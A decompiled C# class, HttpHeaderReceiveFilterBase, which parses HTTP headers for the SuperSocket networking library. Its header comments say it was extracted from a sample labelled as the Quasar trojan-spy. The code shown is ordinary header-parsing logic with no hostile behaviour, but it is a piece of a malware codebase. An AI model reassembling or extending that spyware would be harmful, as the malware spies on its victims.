// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.SuperSocket.ProtoBase.HttpHeaderReceiveFilterBase`1
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using System;
using System.Text;

namespace NoiseMe.Drags.App.Models.SuperSocket.ProtoBase
{
  public abstract class HttpHeaderReceiveFilterBase<TPackageInfo> : 
    TerminatorReceiveFilter<TPackageInfo>
    where TPackageInfo : IPackageInfo
  {
    private static readonly byte[] NewLine = new byte[4]
    {
      (byte) 13,
      (byte) 10,
      (byte) 13,
      (byte) 10
    };

    public Encoding HeaderEncoding { get; private set; }

    protected HttpHeaderReceiveFilterBase()
      : this(Encoding.UTF8)
    {
    }

    protected HttpHeaderReceiveFilterBase(Encoding headerEncoding)
      : this(headerEncoding, HttpHeaderReceiveFilterBase<TPackageInfo>.NewLine)
    {
    }

    protected HttpHeaderReceiveFilterBase(Encoding headerEncoding, byte[] terminator)
      : base(terminator)
    {
      this.HeaderEncoding = headerEncoding != null ? headerEncoding : throw new ArgumentNullException(nameof (headerEncoding));
    }

    protected abstract IReceiveFilter<TPackageInfo> GetBodyReceiveFilter(
      HttpHeaderInfo header,
      int headerSize);

    protected abstract TPackageInfo ResolveHttpPackageWithoutBody(HttpHeaderInfo header);

    public override TPackageInfo ResolvePackage(IBufferStream bufferStream)
    {
      int length = (int) bufferStream.Length;
      string headerData = bufferStream.ReadString(length, this.HeaderEncoding);
      HttpHeaderInfo header1 = new HttpHeaderInfo();
      HttpHeaderInfo header2 = header1;
      MimeHeaderHelper.ParseHttpHeader(headerData, header2);
      IReceiveFilter<TPackageInfo> bodyReceiveFilter = this.GetBodyReceiveFilter(header1, length);
      if (bodyReceiveFilter == null)
        return this.ResolveHttpPackageWithoutBody(header1);
      this.NextReceiveFilter = bodyReceiveFilter;
      bufferStream.Clear();
      return default (TPackageInfo);
    }
  }
}
